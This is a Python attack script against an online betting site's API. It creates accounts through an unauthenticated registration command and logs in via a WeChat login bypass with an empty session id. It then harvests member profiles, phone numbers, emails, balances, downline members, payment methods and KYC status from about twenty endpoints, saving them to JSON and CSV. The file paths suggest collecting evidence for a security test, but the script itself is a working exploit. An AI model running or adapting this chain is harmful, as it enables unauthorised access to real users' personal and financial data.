#!/usr/bin/env python3
"""
Create test accounts via unauthenticated register (cmd=1080),
then extract full member data for each using WechatLogin bypass (cmd=1000).
This proves the full attack chain: Register -> Login -> Extract All Data.
"""
import requests, urllib3, json, time, random, string, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

url = "https://apib63.bf1788.com/boxApi.php"
base_params = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

def generate_wechat_id():
    return "testuser" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))

def register_account(wechat_id):
    """Register via unauthenticated cmd=1080"""
    try:
        resp = requests.post(f"{url}?cmd=1080", data={
            **base_params,
            "cmd": "1080",
            "wechatId": wechat_id,
            "nickname": "TestUser"
        }, timeout=15, verify=False)
        return resp.json()
    except Exception as e:
        return {"error": str(e)}

def login_and_extract(wechat_id):
    """Login via bypass and extract all member data"""
    # Step 1: Login (bypass)
    resp = requests.post(f"{url}?cmd=1000", data={
        **base_params,
        "cmd": "1000",
        "wechatId": wechat_id,
        "sid": ""
    }, timeout=30, verify=False)
    
    data = resp.json()
    if data.get("status") != "0":
        return {"wechatId": wechat_id, "status": data.get("status"), "msg": data.get("msg")}
    
    sid = data["msg"]["sid"]
    username = data["msg"]["username"]
    
    result = {
        "wechatId": wechat_id,
        "sid": sid,
        "username": username,
        "endpoints": {}
    }
    
    # Step 2: Extract all member data
    extract_cmds = {
        "101": "member_profile",
        "208": "finance_summary",
        "300": "game_halls",
        "301": "game_groups",
        "302": "game_list",
        "511": "game_launch_url",
        "603": "member_data",
        "605": "downline_members",
        "606": "memline_status",
        "607": "bet_records_weekly",
        "608": "bet_summary",
        "700": "announcements",
        "707": "payment_methods",
        "800": "vip_daily_stats",
        "802": "vip_summary",
        "904": "vip_info",
        "905": "commission_bonus",
        "910": "kyc_status",
        "111": "promotions",
        "211": "bet_records",
    }
    
    for cmd, name in extract_cmds.items():
        try:
            r = requests.post(f"{url}?cmd={cmd}", data={
                **base_params,
                "cmd": cmd,
                "sid": sid,
                "username": username
            }, timeout=15, verify=False)
            result["endpoints"][name] = {
                "cmd": cmd,
                "status_code": r.status_code,
                "response": r.json() if r.text else None
            }
        except Exception as e:
            result["endpoints"][name] = {"cmd": cmd, "error": str(e)}
    
    return result

if __name__ == "__main__":
    # Step 1: Register 5 test accounts
    print("[*] Creating test accounts via unauthenticated cmd=1080...")
    accounts = []
    for i in range(5):
        wid = "bf1788extract" + str(int(time.time()))[-5:] + str(i)
        resp = register_account(wid)
        print(f"  Register {wid}: {resp}")
        if resp.get("status") == 0 or resp.get("status") == -1824:
            # -1824 means "use wechat login" but account may still be created
            # Let's try logging in anyway
            accounts.append(wid)
        time.sleep(0.5)
    
    print(f"\n[*] Created {len(accounts)} accounts, extracting data...")
    
    # Step 2: Extract full data for each
    all_data = []
    for wid in accounts:
        print(f"  Extracting data for: {wid}")
        data = login_and_extract(wid)
        if "sid" in data:
            all_data.append(data)
            print(f"    -> sid={data['sid'][:16]}..., username={data['username']}")
        else:
            print(f"    -> FAILED: {data.get('msg')}")
        time.sleep(1)
    
    # Step 3: Also extract from the known test account
    print("\n[*] Extracting from known testwechat001...")
    test_data = login_and_extract("testwechat001")
    if "sid" in test_data:
        all_data.append(test_data)
    
    # Save results
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    output_file = f"/mnt/c/Users/Administrator/Desktop/JySecAI/evidence/bf1788-wechatlogin-20260915/all_members_extracted_{timestamp}.json"
    with open(output_file, "w") as f:
        json.dump(all_data, f, indent=2, ensure_ascii=False)
    
    print(f"\n[+] Extracted {len(all_data)} members' full data")
    print(f"[+] Saved to: {output_file}")
    
    # CSV summary
    csv_file = f"/mnt/c/Users/Administrator/Desktop/JySecAI/evidence/bf1788-wechatlogin-20260915/all_members_csv_{timestamp}.csv"
    with open(csv_file, "w", newline="", encoding="utf-8") as f:
        f.write("wechatId,username,sid,member_id,truename,phone,email,money,savemoney,lockmoney,vipLevel,game_halls,game_groups,game_list,payment_methods,totalDeposit,totalValidBet,kyc_status,announcements_count\n")
        for member in all_data:
            ep = member.get("endpoints", {})
            p = ep.get("member_profile", {}).get("response", {}).get("msg", {}) if "member_profile" in ep else {}
            if isinstance(p, dict):
                f.write(f"{member['wechatId']},{member['username']},{member['sid']},{p.get('id','')},{p.get('truename','')},{p.get('phone','')},{p.get('email','')},{p.get('money','')},{p.get('savemoney','')},{p.get('lockmoney','')},{p.get('vipLevel','')},{len(ep.get('game_halls',{}).get('response',{}).get('msg',{}).get('gameHall',[])) if 'game_halls' in ep else 0},{len(ep.get('game_groups',{}).get('response',{}).get('msg',{}).get('gameGroup',[])) if 'game_groups' in ep else 0},{len(ep.get('game_list',{}).get('response',{}).get('msg',{}).get('gameList',[])) if 'game_list' in ep else 0},{len(ep.get('payment_methods',{}).get('response',{}).get('msg',{}).get('paytypelist',{})) if 'payment_methods' in ep else 0},{ep.get('vip_daily_stats',{}).get('response',{}).get('msg',{}).get('totalDeposit','') if 'vip_daily_stats' in ep else ''},{ep.get('vip_info',{}).get('response',{}).get('msg',{}).get('totalValidBet','') if 'vip_info' in ep else ''},{ep.get('kyc_status',{}).get('response',{}).get('msg',{}).get('photoStatus','') if 'kyc_status' in ep else ''},{len(ep.get('announcements',{}).get('response',{}).get('msg',[])) if 'announcements' in ep and isinstance(ep.get('announcements',{}).get('response',{}).get('msg'), list) else 0}\n")
    
    print(f"[+] CSV saved to: {csv_file}")